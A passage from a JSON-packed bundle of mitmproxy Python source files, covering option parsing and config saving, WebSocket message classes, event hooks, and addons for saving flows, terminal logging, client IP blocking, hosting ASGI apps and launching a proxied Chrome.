{o.name}\")\n            else:\n                return None\n        elif o.typespec == bool:\n            if optstr == \"toggle\":\n                return not o.current()\n            if not optstr or optstr == \"true\":\n                return True\n            elif optstr == \"false\":\n                return False\n            else:\n                raise exceptions.OptionsError(\n                    'Boolean must be \"true\", \"false\", or have the value omitted (a synonym for \"true\").'\n                )\n        raise NotImplementedError(f\"Unsupported option type: {o.typespec}\")\n\n    def make_parser(self, parser, optname, metavar=None, short=None):\n        \"\"\"\n        Auto-Create a command-line parser entry for a named option. If the\n        option does not exist, it is ignored.\n        \"\"\"\n        if optname not in self._options:\n            return\n\n        o = self._options[optname]\n\n        def mkf(x, s):\n            x = x.replace(\"_\", \"-\")\n            f = [\"--%s\" % x]\n            if s:\n                f.append(\"-\" + s)\n            return f\n\n        flags = mkf(optname, short)\n\n        if o.typespec == bool:\n            g = parser.add_mutually_exclusive_group(required=False)\n            onf = mkf(optname, None)\n            offf = mkf(\"no-\" + optname, None)\n            # The short option for a bool goes to whatever is NOT the default\n            if short:\n                if o.default:\n                    offf = mkf(\"no-\" + optname, short)\n                else:\n                    onf = mkf(optname, short)\n            g.add_argument(\n                *offf,\n                action=\"store_false\",\n                dest=optname,\n            )\n            g.add_argument(*onf, action=\"store_true\", dest=optname, help=o.help)\n            parser.set_defaults(**{optname: None})\n        elif o.typespec in (int, Optional[int]):\n            parser.add_argument(\n                *flags,\n                action=\"store\",\n                type=int,\n                dest=optname,\n                help=o.help,\n                metavar=metavar,\n            )\n        elif o.typespec in (str, Optional[str]):\n            parser.add_argument(\n                *flags,\n                action=\"store\",\n                type=str,\n                dest=optname,\n                help=o.help,\n                metavar=metavar,\n                choices=o.choices,\n            )\n        elif o.typespec == Sequence[str]:\n            parser.add_argument(\n                *flags,\n                action=\"append\",\n                type=str,\n                dest=optname,\n                help=o.help + \" May be passed multiple times.\",\n                metavar=metavar,\n                choices=o.choices,\n            )\n        else:\n            raise ValueError(\"Unsupported option type: %s\", o.typespec)\n\n\ndef dump_defaults(opts, out: TextIO):\n    \"\"\"\n    Dumps an annotated file with all options.\n    \"\"\"\n    # Sort data\n    s = ruamel.yaml.comments.CommentedMap()\n    for k in sorted(opts.keys()):\n        o = opts._options[k]\n        s[k] = o.default\n        txt = o.help.strip()\n\n        if o.choices:\n            txt += \" Valid values are %s.\" % \", \".join(repr(c) for c in o.choices)\n        else:\n            t = typecheck.typespec_to_str(o.typespec)\n            txt += \" Type %s.\" % t\n\n        txt = \"\\n\".join(textwrap.wrap(txt))\n        s.yaml_set_comment_before_after_key(k, before=\"\\n\" + txt)\n    return ruamel.yaml.YAML().dump(s, out)\n\n\ndef dump_dicts(opts, keys: Iterable[str] | None = None) -> dict:\n    \"\"\"\n    Dumps the options into a list of dict object.\n\n    Return: A list like: { \"anticache\": { type: \"bool\", default: false, value: true, help: \"help text\"} }\n    \"\"\"\n    options_dict = {}\n    if keys is None:\n        keys = opts.keys()\n    for k in sorted(keys):\n        o = opts._options[k]\n        t = typecheck.typespec_to_str(o.typespec)\n        option = {\n            \"type\": t,\n            \"default\": o.default,\n            \"value\": o.current(),\n            \"help\": o.help,\n            \"choices\": o.choices,\n        }\n        options_dict[k] = option\n    return options_dict\n\n\ndef parse(text):\n    if not text:\n        return {}\n    try:\n        yaml = ruamel.yaml.YAML(typ=\"safe\", pure=True)\n        data = yaml.load(text)\n    except ruamel.yaml.error.YAMLError as v:\n        if hasattr(v, \"problem_mark\"):\n            snip = v.problem_mark.get_snippet()\n            raise exceptions.OptionsError(\n                \"Config error at line %s:\\n%s\\n%s\"\n                % (v.problem_mark.line + 1, snip, getattr(v, \"problem\", \"\"))\n            )\n        else:\n            raise exceptions.OptionsError(\"Could not parse options.\")\n    if isinstance(data, str):\n        raise exceptions.OptionsError(\"Config error - no keys found.\")\n    elif data is None:\n        return {}\n    return data\n\n\ndef load(opts: OptManager, text: str, cwd: Path | str | None = None) -> None:\n    \"\"\"\n    Load configuration from text, over-writing options already set in\n    this object. May raise OptionsError if the config file is invalid.\n    \"\"\"\n    data = parse(text)\n\n    scripts = data.get(\"scripts\")\n    if scripts is not None and cwd is not None:\n        data[\"scripts\"] = [\n            str(relative_path(Path(path), relative_to=Path(cwd))) for path in scripts\n        ]\n\n    opts.update_defer(**data)\n\n\ndef load_paths(opts: OptManager, *paths: Path | str) -> None:\n    \"\"\"\n    Load paths in order. Each path takes precedence over the previous\n    path. Paths that don't exist are ignored, errors raise an\n    OptionsError.\n    \"\"\"\n    for p in paths:\n        p = Path(p).expanduser()\n        if p.exists() and p.is_file():\n            with p.open(encoding=\"utf8\") as f:\n                try:\n                    txt = f.read()\n                except UnicodeDecodeError as e:\n                    raise exceptions.OptionsError(f\"Error reading {p}: {e}\")\n            try:\n                load(opts, txt, cwd=p.absolute().parent)\n            except exceptions.OptionsError as e:\n                raise exceptions.OptionsError(f\"Error reading {p}: {e}\")\n\n\ndef serialize(\n    opts: OptManager, file: TextIO, text: str, defaults: bool = False\n) -> None:\n    \"\"\"\n    Performs a round-trip serialization. If text is not None, it is\n    treated as a previous serialization that should be modified\n    in-place.\n\n    - If \"defaults\" is False, only options with non-default values are\n        serialized. Default values in text are preserved.\n    - Unknown options in text are removed.\n    - Raises OptionsError if text is invalid.\n    \"\"\"\n    data = parse(text)\n    for k in opts.keys():\n        if defaults or opts.has_changed(k):\n            data[k] = getattr(opts, k)\n    for k in list(data.keys()):\n        if k not in opts._options:\n            del data[k]\n\n    ruamel.yaml.YAML().dump(data, file)\n\n\ndef save(opts: OptManager, path: Path | str, defaults: bool = False) -> None:\n    \"\"\"\n    Save to path. If the destination file exists, modify it in-place.\n\n    Raises OptionsError if the existing data is corrupt.\n    \"\"\"\n    path = Path(path).expanduser()\n    if path.exists() and path.is_file():\n        with path.open(encoding=\"utf8\") as f:\n            try:\n                data = f.read()\n            except UnicodeDecodeError as e:\n                raise exceptions.OptionsError(f\"Error trying to modify {path}: {e}\")\n    else:\n        data = \"\"\n\n    with path.open(\"w\", encoding=\"utf8\") as f:\n        serialize(opts, f, data, defaults)\n\n\ndef relative_path(script_path: Path | str, *, relative_to: Path | str) -> Path:\n    \"\"\"\n    Make relative paths found in config files relative to said config file,\n    instead of relative to where the command is ran.\n    \"\"\"\n    script_path = Path(script_path)\n    # Edge case when $HOME is not an absolute path\n    if script_path.expanduser() != script_path and not script_path.is_absolute():\n        script_path = script_path.expanduser().absolute()\n    return (relative_to / script_path.expanduser()).absolute()\n", "mitmproxy/__init__.py": "", "mitmproxy/websocket.py": "\"\"\"\nMitmproxy used to have its own WebSocketFlow type until mitmproxy 6, but now WebSocket connections now are represented\nas HTTP flows as well. They can be distinguished from regular HTTP requests by having the\n`mitmproxy.http.HTTPFlow.websocket` attribute set.\n\nThis module only defines the classes for individual `WebSocketMessage`s and the `WebSocketData` container.\n\"\"\"\n\nimport time\nimport warnings\nfrom dataclasses import dataclass\nfrom dataclasses import field\n\nfrom wsproto.frame_protocol import Opcode\n\nfrom mitmproxy.coretypes import serializable\n\nWebSocketMessageState = tuple[int, bool, bytes, float, bool, bool]\n\n\nclass WebSocketMessage(serializable.Serializable):\n    \"\"\"\n    A single WebSocket message sent from one peer to the other.\n\n    Fragmented WebSocket messages are reassembled by mitmproxy and then\n    represented as a single instance of this class.\n\n    The [WebSocket RFC](https://tools.ietf.org/html/rfc6455) specifies both\n    text and binary messages. To avoid a whole class of nasty type confusion bugs,\n    mitmproxy stores all message contents as `bytes`. If you need a `str`, you can access the `text` property\n    on text messages:\n\n    >>> if message.is_text:\n    >>>     text = message.text\n    \"\"\"\n\n    from_client: bool\n    \"\"\"True if this messages was sent by the client.\"\"\"\n    type: Opcode\n    \"\"\"\n    The message type, as per RFC 6455's [opcode](https://tools.ietf.org/html/rfc6455#section-5.2).\n\n    Mitmproxy currently only exposes messages assembled from `TEXT` and `BINARY` frames.\n    \"\"\"\n    content: bytes\n    \"\"\"A byte-string representing the content of this message.\"\"\"\n    timestamp: float\n    \"\"\"Timestamp of when this message was received or created.\"\"\"\n    dropped: bool\n    \"\"\"True if the message has not been forwarded by mitmproxy, False otherwise.\"\"\"\n    injected: bool\n    \"\"\"True if the message was injected and did not originate from a client/server, False otherwise\"\"\"\n\n    def __init__(\n        self,\n        type: int | Opcode,\n        from_client: bool,\n        content: bytes,\n        timestamp: float | None = None,\n        dropped: bool = False,\n        injected: bool = False,\n    ) -> None:\n        self.from_client = from_client\n        self.type = Opcode(type)\n        self.content = content\n        self.timestamp: float = timestamp or time.time()\n        self.dropped = dropped\n        self.injected = injected\n\n    @classmethod\n    def from_state(cls, state: WebSocketMessageState):\n        return cls(*state)\n\n    def get_state(self) -> WebSocketMessageState:\n        return (\n            int(self.type),\n            self.from_client,\n            self.content,\n            self.timestamp,\n            self.dropped,\n            self.injected,\n        )\n\n    def set_state(self, state: WebSocketMessageState) -> None:\n        (\n            typ,\n            self.from_client,\n            self.content,\n            self.timestamp,\n            self.dropped,\n            self.injected,\n        ) = state\n        self.type = Opcode(typ)\n\n    def _format_ws_message(self) -> bytes:\n        if self.from_client:\n            return b\"[OUTGOING] \" + self.content\n        else:\n            return b\"[INCOMING] \" + self.content\n\n    def __repr__(self):\n        if self.type == Opcode.TEXT:\n            return repr(self.content.decode(errors=\"replace\"))\n        else:\n            return repr(self.content)\n\n    @property\n    def is_text(self) -> bool:\n        \"\"\"\n        `True` if this message is assembled from WebSocket `TEXT` frames,\n        `False` if it is assembled from `BINARY` frames.\n        \"\"\"\n        return self.type == Opcode.TEXT\n\n    def drop(self):\n        \"\"\"Drop this message, i.e. don't forward it to the other peer.\"\"\"\n        self.dropped = True\n\n    def kill(self):  # pragma: no cover\n        \"\"\"A deprecated alias for `.drop()`.\"\"\"\n        warnings.warn(\n            \"WebSocketMessage.kill() is deprecated, use .drop() instead.\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        self.drop()\n\n    @property\n    def text(self) -> str:\n        \"\"\"\n        The message content as text.\n\n        This attribute is only available if `WebSocketMessage.is_text` is `True`.\n\n        *See also:* `WebSocketMessage.content`\n        \"\"\"\n        if self.type != Opcode.TEXT:\n            raise AttributeError(\n                f\"{self.type.name.title()} WebSocket frames do not have a 'text' attribute.\"\n            )\n\n        return self.content.decode()\n\n    @text.setter\n    def text(self, value: str) -> None:\n        if self.type != Opcode.TEXT:\n            raise AttributeError(\n                f\"{self.type.name.title()} WebSocket frames do not have a 'text' attribute.\"\n            )\n\n        self.content = value.encode()\n\n\n@dataclass\nclass WebSocketData(serializable.SerializableDataclass):\n    \"\"\"\n    A data container for everything related to a single WebSocket connection.\n    This is typically accessed as `mitmproxy.http.HTTPFlow.websocket`.\n    \"\"\"\n\n    messages: list[WebSocketMessage] = field(default_factory=list)\n    \"\"\"All `WebSocketMessage`s transferred over this connection.\"\"\"\n\n    closed_by_client: bool | None = None\n    \"\"\"\n    `True` if the client closed the connection,\n    `False` if the server closed the connection,\n    `None` if the connection is active.\n    \"\"\"\n    close_code: int | None = None\n    \"\"\"[Close Code](https://tools.ietf.org/html/rfc6455#section-7.1.5)\"\"\"\n    close_reason: str | None = None\n    \"\"\"[Close Reason](https://tools.ietf.org/html/rfc6455#section-7.1.6)\"\"\"\n\n    timestamp_end: float | None = None\n    \"\"\"*Timestamp:* WebSocket connection closed.\"\"\"\n\n    def __repr__(self):\n        return f\"<WebSocketData ({len(self.messages)} messages)>\"\n\n    def _get_formatted_messages(self) -> bytes:\n        return b\"\\n\".join(m._format_ws_message() for m in self.messages)\n", "mitmproxy/hooks.py": "import re\nimport warnings\nfrom collections.abc import Sequence\nfrom dataclasses import dataclass\nfrom dataclasses import fields\nfrom dataclasses import is_dataclass\nfrom typing import Any\nfrom typing import ClassVar\nfrom typing import TYPE_CHECKING\n\nimport mitmproxy.flow\n\nif TYPE_CHECKING:\n    import mitmproxy.addonmanager\n    import mitmproxy.log\n\n\nclass Hook:\n    name: ClassVar[str]\n\n    def args(self) -> list[Any]:\n        args = []\n        for field in fields(self):  # type: ignore[arg-type]\n            args.append(getattr(self, field.name))\n        return args\n\n    def __new__(cls, *args, **kwargs):\n        if cls is Hook:\n            raise TypeError(\"Hook may not be instantiated directly.\")\n        if not is_dataclass(cls):\n            raise TypeError(\"Subclass is not a dataclass.\")\n        return super().__new__(cls)\n\n    def __init_subclass__(cls, **kwargs):\n        # initialize .name attribute. HttpRequestHook -> http_request\n        if cls.__dict__.get(\"name\", None) is None:\n            name = cls.__name__.replace(\"Hook\", \"\")\n            cls.name = re.sub(\"(?!^)([A-Z]+)\", r\"_\\1\", name).lower()\n        if cls.name in all_hooks:\n            other = all_hooks[cls.name]\n            warnings.warn(\n                f\"Two conflicting event classes for {cls.name}: {cls} and {other}\",\n                RuntimeWarning,\n            )\n        if cls.name == \"\":\n            return  # don't register Hook class.\n        all_hooks[cls.name] = cls\n\n        # define a custom hash and __eq__ function so that events are hashable and not comparable.\n        cls.__hash__ = object.__hash__  # type: ignore\n        cls.__eq__ = object.__eq__  # type: ignore\n\n\nall_hooks: dict[str, type[Hook]] = {}\n\n\n@dataclass\nclass ConfigureHook(Hook):\n    \"\"\"\n    Called when configuration changes. The updated argument is a\n    set-like object containing the keys of all changed options. This\n    event is called during startup with all options in the updated set.\n    \"\"\"\n\n    updated: set[str]\n\n\n@dataclass\nclass DoneHook(Hook):\n    \"\"\"\n    Called when the addon shuts down, either by being removed from\n    the mitmproxy instance, or when mitmproxy itself shuts down. On\n    shutdown, this event is called after the event loop is\n    terminated, guaranteeing that it will be the final event an addon\n    sees. Note that log handlers are shut down at this point, so\n    calls to log functions will produce no output.\n    \"\"\"\n\n\n@dataclass\nclass RunningHook(Hook):\n    \"\"\"\n    Called when the proxy is completely up and running. At this point,\n    you can expect all addons to be loaded and all options to be set.\n    \"\"\"\n\n\n@dataclass\nclass UpdateHook(Hook):\n    \"\"\"\n    Update is called when one or more flow objects have been modified,\n    usually from a different addon.\n    \"\"\"\n\n    flows: Sequence[mitmproxy.flow.Flow]\n", "mitmproxy/addons/save.py": "import logging\nimport os.path\nimport sys\nfrom collections.abc import Sequence\nfrom datetime import datetime\nfrom functools import lru_cache\nfrom pathlib import Path\nfrom typing import Literal\nfrom typing import Optional\n\nimport mitmproxy.types\nfrom mitmproxy import command\nfrom mitmproxy import ctx\nfrom mitmproxy import dns\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy import flowfilter\nfrom mitmproxy import http\nfrom mitmproxy import io\nfrom mitmproxy import tcp\nfrom mitmproxy import udp\nfrom mitmproxy.log import ALERT\n\n\n@lru_cache\ndef _path(path: str) -> str:\n    \"\"\"Extract the path from a path spec (which may have an extra \"+\" at the front)\"\"\"\n    if path.startswith(\"+\"):\n        path = path[1:]\n    return os.path.expanduser(path)\n\n\n@lru_cache\ndef _mode(path: str) -> Literal[\"ab\", \"wb\"]:\n    \"\"\"Extract the writing mode (overwrite or append) from a path spec\"\"\"\n    if path.startswith(\"+\"):\n        return \"ab\"\n    else:\n        return \"wb\"\n\n\nclass Save:\n    def __init__(self) -> None:\n        self.stream: io.FilteredFlowWriter | None = None\n        self.filt: flowfilter.TFilter | None = None\n        self.active_flows: set[flow.Flow] = set()\n        self.current_path: str | None = None\n\n    def load(self, loader):\n        loader.add_option(\n            \"save_stream_file\",\n            Optional[str],\n            None,\n            \"\"\"\n            Stream flows to file as they arrive. Prefix path with + to append.\n            The full path can use python strftime() formating, missing\n            directories are created as needed. A new file is opened every time\n            the formatted string changes.\n            \"\"\",\n        )\n        loader.add_option(\n            \"save_stream_filter\",\n            Optional[str],\n            None,\n            \"Filter which flows are written to file.\",\n        )\n\n    def configure(self, updated):\n        if \"save_stream_filter\" in updated:\n            if ctx.options.save_stream_filter:\n                try:\n                    self.filt = flowfilter.parse(ctx.options.save_stream_filter)\n                except ValueError as e:\n                    raise exceptions.OptionsError(str(e)) from e\n            else:\n                self.filt = None\n        if \"save_stream_file\" in updated or \"save_stream_filter\" in updated:\n            if ctx.options.save_stream_file:\n                try:\n                    self.maybe_rotate_to_new_file()\n                except OSError as e:\n                    raise exceptions.OptionsError(str(e)) from e\n                assert self.stream\n                self.stream.flt = self.filt\n            else:\n                self.done()\n\n    def maybe_rotate_to_new_file(self) -> None:\n        path = datetime.today().strftime(_path(ctx.options.save_stream_file))\n        if self.current_path == path:\n            return\n\n        if self.stream:\n            self.stream.fo.close()\n            self.stream = None\n\n        new_log_file = Path(path)\n        new_log_file.parent.mkdir(parents=True, exist_ok=True)\n\n        f = new_log_file.open(_mode(ctx.options.save_stream_file))\n        self.stream = io.FilteredFlowWriter(f, self.filt)\n        self.current_path = path\n\n    def save_flow(self, flow: flow.Flow) -> None:\n        \"\"\"\n        Write the flow to the stream, but first check if we need to rotate to a new file.\n        \"\"\"\n        if not self.stream:\n            return\n        try:\n            self.maybe_rotate_to_new_file()\n            self.stream.add(flow)\n        except OSError as e:\n            # If we somehow fail to write flows to a logfile, we really want to crash visibly\n            # instead of letting traffic through unrecorded.\n            # No normal logging here, that would not be triggered anymore.\n            sys.stderr.write(f\"Error while writing to {self.current_path}: {e}\")\n            sys.exit(1)\n        else:\n            self.active_flows.discard(flow)\n\n    def done(self) -> None:\n        if self.stream:\n            for f in self.active_flows:\n                self.stream.add(f)\n            self.active_flows.clear()\n\n            self.current_path = None\n            self.stream.fo.close()\n            self.stream = None\n\n    @command.command(\"save.file\")\n    def save(self, flows: Sequence[flow.Flow], path: mitmproxy.types.Path) -> None:\n        \"\"\"\n        Save flows to a file. If the path starts with a +, flows are\n        appended to the file, otherwise it is over-written.\n        \"\"\"\n        try:\n            with open(_path(path), _mode(path)) as f:\n                stream = io.FlowWriter(f)\n                for i in flows:\n                    stream.add(i)\n        except OSError as e:\n            raise exceptions.CommandError(e) from e\n        if path.endswith(\".har\") or path.endswith(\".zhar\"):  # pragma: no cover\n            logging.log(\n                ALERT,\n                f\"Saved as mitmproxy dump file. To save HAR files, use the `save.har` command.\",\n            )\n        else:\n            logging.log(ALERT, f\"Saved {len(flows)} flows.\")\n\n    def tcp_start(self, flow: tcp.TCPFlow):\n        if self.stream:\n            self.active_flows.add(flow)\n\n    def tcp_end(self, flow: tcp.TCPFlow):\n        self.save_flow(flow)\n\n    def tcp_error(self, flow: tcp.TCPFlow):\n        self.tcp_end(flow)\n\n    def udp_start(self, flow: udp.UDPFlow):\n        if self.stream:\n            self.active_flows.add(flow)\n\n    def udp_end(self, flow: udp.UDPFlow):\n        self.save_flow(flow)\n\n    def udp_error(self, flow: udp.UDPFlow):\n        self.udp_end(flow)\n\n    def websocket_end(self, flow: http.HTTPFlow):\n        self.save_flow(flow)\n\n    def request(self, flow: http.HTTPFlow):\n        if self.stream:\n            self.active_flows.add(flow)\n\n    def response(self, flow: http.HTTPFlow):\n        # websocket flows will receive a websocket_end,\n        # we don't want to persist them here already\n        if flow.websocket is None:\n            self.save_flow(flow)\n\n    def error(self, flow: http.HTTPFlow):\n        self.response(flow)\n\n    def dns_request(self, flow: dns.DNSFlow):\n        if self.stream:\n            self.active_flows.add(flow)\n\n    def dns_response(self, flow: dns.DNSFlow):\n        self.save_flow(flow)\n\n    def dns_error(self, flow: dns.DNSFlow):\n        self.save_flow(flow)\n", "mitmproxy/addons/termlog.py": "from __future__ import annotations\n\nimport asyncio\nimport logging\nimport sys\nfrom typing import IO\n\nfrom mitmproxy import ctx\nfrom mitmproxy import log\nfrom mitmproxy.utils import vt_codes\n\n\nclass TermLog:\n    _teardown_task: asyncio.Task | None = None\n\n    def __init__(self, out: IO[str] | None = None):\n        self.logger = TermLogHandler(out)\n        self.logger.install()\n\n    def load(self, loader):\n        loader.add_option(\n            \"termlog_verbosity\", str, \"info\", \"Log verbosity.\", choices=log.LogLevels\n        )\n        self.logger.setLevel(logging.INFO)\n\n    def configure(self, updated):\n        if \"termlog_verbosity\" in updated:\n            self.logger.setLevel(ctx.options.termlog_verbosity.upper())\n\n    def uninstall(self) -> None:\n        # uninstall the log dumper.\n        # This happens at the very very end after done() is completed,\n        # because we don't want to uninstall while other addons are still logging.\n        self.logger.uninstall()\n\n\nclass TermLogHandler(log.MitmLogHandler):\n    def __init__(self, out: IO[str] | None = None):\n        super().__init__()\n        self.file: IO[str] = out or sys.stdout\n        self.has_vt_codes = vt_codes.ensure_supported(self.file)\n        self.formatter = log.MitmFormatter(self.has_vt_codes)\n\n    def emit(self, record: logging.LogRecord) -> None:\n        try:\n            print(self.format(record), file=self.file)\n        except OSError:\n            # We cannot print, exit immediately.\n            # See https://github.com/mitmproxy/mitmproxy/issues/4669\n            sys.exit(1)\n", "mitmproxy/addons/block.py": "import ipaddress\nimport logging\n\nfrom mitmproxy import ctx\n\n\nclass Block:\n    def load(self, loader):\n        loader.add_option(\n            \"block_global\",\n            bool,\n            True,\n            \"\"\"\n            Block connections from public IP addresses.\n            \"\"\",\n        )\n        loader.add_option(\n            \"block_private\",\n            bool,\n            False,\n            \"\"\"\n            Block connections from local (private) IP addresses.\n            This option does not affect loopback addresses (connections from the local machine),\n            which are always permitted.\n            \"\"\",\n        )\n\n    def client_connected(self, client):\n        parts = client.peername[0].rsplit(\"%\", 1)\n        address = ipaddress.ip_address(parts[0])\n        if isinstance(address, ipaddress.IPv6Address):\n            address = address.ipv4_mapped or address\n\n        if address.is_loopback:\n            return\n\n        if ctx.options.block_private and address.is_private:\n            logging.warning(\n                f\"Client connection from {client.peername[0]} killed by block_private option.\"\n            )\n            client.error = \"Connection killed by block_private.\"\n\n        if ctx.options.block_global and address.is_global:\n            logging.warning(\n                f\"Client connection from {client.peername[0]} killed by block_global option.\"\n            )\n            client.error = \"Connection killed by block_global.\"\n", "mitmproxy/addons/asgiapp.py": "import asyncio\nimport logging\nimport urllib.parse\n\nimport asgiref.compatibility\nimport asgiref.wsgi\n\nfrom mitmproxy import ctx\nfrom mitmproxy import http\n\nlogger = logging.getLogger(__name__)\n\n\nclass ASGIApp:\n    \"\"\"\n    An addon that hosts an ASGI/WSGI HTTP app within mitmproxy, at a specified hostname and port.\n\n    Some important caveats:\n        - This implementation will block and wait until the entire HTTP response is completed before sending out data.\n        - It currently only implements the HTTP protocol (Lifespan and WebSocket are unimplemented).\n    \"\"\"\n\n    def __init__(self, asgi_app, host: str, port: int | None):\n        asgi_app = asgiref.compatibility.guarantee_single_callable(asgi_app)\n        self.asgi_app, self.host, self.port = asgi_app, host, port\n\n    @property\n    def name(self) -> str:\n        return f\"asgiapp:{self.host}:{self.port}\"\n\n    def should_serve(self, flow: http.HTTPFlow) -> bool:\n        return bool(\n            flow.request.pretty_host == self.host\n            and (self.port is None or flow.request.port == self.port)\n            and flow.live\n            and not flow.error\n            and not flow.response\n        )\n\n    async def request(self, flow: http.HTTPFlow) -> None:\n        if self.should_serve(flow):\n            await serve(self.asgi_app, flow)\n\n\nclass WSGIApp(ASGIApp):\n    def __init__(self, wsgi_app, host: str, port: int | None):\n        asgi_app = asgiref.wsgi.WsgiToAsgi(wsgi_app)\n        super().__init__(asgi_app, host, port)\n\n\nHTTP_VERSION_MAP = {\n    \"HTTP/1.0\": \"1.0\",\n    \"HTTP/1.1\": \"1.1\",\n    \"HTTP/2.0\": \"2\",\n}\n\n\ndef make_scope(flow: http.HTTPFlow) -> dict:\n    # %3F is a quoted question mark\n    quoted_path = urllib.parse.quote_from_bytes(flow.request.data.path).split(\n        \"%3F\", maxsplit=1\n    )\n\n    # (Unicode string) \u2013 HTTP request target excluding any query string, with percent-encoded\n    # sequences and UTF-8 byte sequences decoded into characters.\n    path = quoted_path[0]\n\n    # (byte string) \u2013 URL portion after the ?, percent-encoded.\n    query_string: bytes\n    if len(quoted_path) > 1:\n        query_string = urllib.parse.unquote(quoted_path[1]).encode()\n    else:\n        query_string = b\"\"\n\n    return {\n        \"type\": \"http\",\n        \"asgi\": {\n            \"version\": \"3.0\",\n            \"spec_version\": \"2.1\",\n        },\n        \"http_version\": HTTP_VERSION_MAP.get(flow.request.http_version, \"1.1\"),\n        \"method\": flow.request.method,\n        \"scheme\": flow.request.scheme.upper(),\n        \"path\": path,\n        \"raw_path\": flow.request.path,\n        \"query_string\": query_string,\n        \"headers\": [\n            (name.lower(), value) for (name, value) in flow.request.headers.fields\n        ],\n        \"client\": flow.client_conn.peername,\n        \"extensions\": {\n            \"mitmproxy.master\": ctx.master,\n        },\n    }\n\n\nasync def serve(app, flow: http.HTTPFlow):\n    \"\"\"\n    Serves app on flow.\n    \"\"\"\n\n    scope = make_scope(flow)\n    done = asyncio.Event()\n    received_body = False\n    sent_response = False\n\n    async def receive():\n        nonlocal received_body\n        if not received_body:\n            received_body = True\n            return {\n                \"type\": \"http.request\",\n                \"body\": flow.request.raw_content,\n            }\n        else:  # pragma: no cover\n            # We really don't expect this to be called a second time, but what to do?\n            # We just wait until the request is done before we continue here with sending a disconnect.\n            await done.wait()\n            return {\"type\": \"http.disconnect\"}\n\n    async def send(event):\n        if event[\"type\"] == \"http.response.start\":\n            flow.response = http.Response.make(\n                event[\"status\"], b\"\", event.get(\"headers\", [])\n            )\n            flow.response.decode()\n        elif event[\"type\"] == \"http.response.body\":\n            assert flow.response\n            flow.response.content += event.get(\"body\", b\"\")\n            if not event.get(\"more_body\", False):\n                nonlocal sent_response\n                sent_response = True\n        else:\n            raise AssertionError(f\"Unexpected event: {event['type']}\")\n\n    try:\n        await app(scope, receive, send)\n        if not sent_response:\n            raise RuntimeError(f\"no response sent.\")\n    except Exception as e:\n        logger.exception(f\"Error in asgi app: {e}\")\n        flow.response = http.Response.make(500, b\"ASGI Error.\")\n    finally:\n        done.set()\n", "mitmproxy/addons/browser.py": "import logging\nimport shutil\nimport subprocess\nimport tempfile\n\nfrom mitmproxy import command\nfrom mitmproxy import ctx\nfrom mitmproxy.log import ALERT\n\n\ndef get_chrome_executable() -> str | None:\n    for browser in (\n        \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\",\n        # https://stackoverflow.com/questions/40674914/google-chrome-path-in-windows-10\n        r\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\",\n        r\"C:\\Program Files (x86)\\Google\\Application\\chrome.exe\",\n        # Linux binary names from Python's webbrowser module.\n        \"google-chrome\",\n        \"google-chrome-stable\",\n        \"chrome\",\n        \"chromium\",\n        \"chromium-browser\",\n        \"google-chrome-unstable\",\n    ):\n        if shutil.which(browser):\n            return browser\n\n    return None\n\n\ndef get_chrome_flatpak() -> str | None:\n    if shutil.which(\"flatpak\"):\n        for browser in (\n            \"com.google.Chrome\",\n            \"org.chromium.Chromium\",\n            \"com.github.Eloston.UngoogledChromium\",\n            \"com.google.ChromeDev\",\n        ):\n            if (\n                subprocess.run(\n                    [\"flatpak\", \"info\", browser],\n                    stdout=subprocess.DEVNULL,\n                    stderr=subprocess.DEVNULL,\n                ).returncode\n                == 0\n            ):\n                return browser\n\n    return None\n\n\ndef get_browser_cmd() -> list[str] | None:\n    if browser := get_chrome_executable():\n        return [browser]\n    elif browser := get_chrome_flatpak():\n        return [\"flatpak\", \"run\", \"-p\", browser]\n\n    return None\n\n\nclass Browser:\n    browser: list[subprocess.Popen] = []\n    tdir: list[tempfile.TemporaryDirectory] = []\n\n    @command.command(\"browser.start\")\n    def start(self) -> None:\n        \"\"\"\n        Start an isolated instance of Chrome that points to the currently\n        running proxy.\n        \"\"\"\n        if len(self.browser) > 0:\n            logging.log(ALERT, \"Starting additional browser\")\n\n        cmd = get_browser_cmd()\n        if not cmd:\n            logging.log(\n                ALERT, \"Your platform is not supported yet - please submit a patch.\"\n            )\n            return\n\n        tdir = tempfile.TemporaryDirectory()\n        self.tdir.append(tdir)\n        self.browser.append(\n            subprocess.Popen(\n                [\n                    *cmd,\n                    \"--user-data-dir=%s\" % str(tdir.name),\n                    \"--proxy-server={}:{}\".format(\n                        ctx.options.listen_host or \"127.0.0.1\",\n                        ctx.options.listen_port or \"8080\",\n                    ),\n                    \"--disable-fre\",\n                    \"--no-default-browser-check\",\n                    \"--no-first-run\",\n                    \"--disable-extensions\",\n                    \"about:blank\",\n                ],\n                stdout=subprocess.DEVNULL,\n                stderr=subprocess.DEVNULL,\n            )\n        )\n\n    def done(self):\n        for browser in self.browser:\n            browser.kill()\n        for tdir in self.tdir:\n            tdir.cleanup()\n        self.browser = []\n        self.tdir = []\n", "mitmproxy/addons/eventstore.py": "import asyncio\nimport collections\nimport logging\nfrom collections.abc import Callable\n\nfrom mitmproxy import command\nfrom mitmproxy import log\nfrom mitmproxy.log import LogEntry\nfrom mitmproxy.utils import signals\n\n\nclass EventStore:\n    def __init__(self, size: int = 10000) -> None:\n        self.data: collections.deque[LogEntry] = collections.deque(maxlen=size)\n        self.sig_add = signals.SyncSignal(lambda entry: None)\n        self.sig_refresh = signals.SyncSignal(lambda: None)\n\n        self.logger = CallbackLogger(self._add_log)\n        self.logger.install()\n\n    def done(self):\n        self.logger.uninstall()\n\n    def _add_log(self, entry: LogEntry) -> None:\n        self.data.append(entry)\n        self.sig_add.send(entry)\n\n    @property\n    def size(self) -> int | None:\n        return self.data.maxlen\n\n    @command.command(\"eventstore.clear\")\n    def clear(self) -> None:\n        \"\"\"\n        Clear the event log.\n        \"\"\"\n        self.data.clear()\n        self.sig_refresh.send()\n\n\nclass CallbackLogger(log.MitmLogHandler):\n    def __init__(\n        self,\n        callback: Callable[[LogEntry], None],\n    ):\n        super().__init__()\n        self.callback = callback\n        self.event_loop = asyncio.get_running_loop()\n        self.formatter = log.MitmFormatter(colorize=False)\n\n    def emit(self, record: logging.LogRecord) -> None:\n        entry = LogEntry(\n            msg=self.format(record),\n            level=log.LOGGING_LEVELS_TO_LOGENTRY.get(record.levelno, \"error\"),\n        )\n        self.event_loop.call_soon_threadsafe(self.callback, entry)\n", "mitmproxy/addons/blocklist.py": "from collections.abc 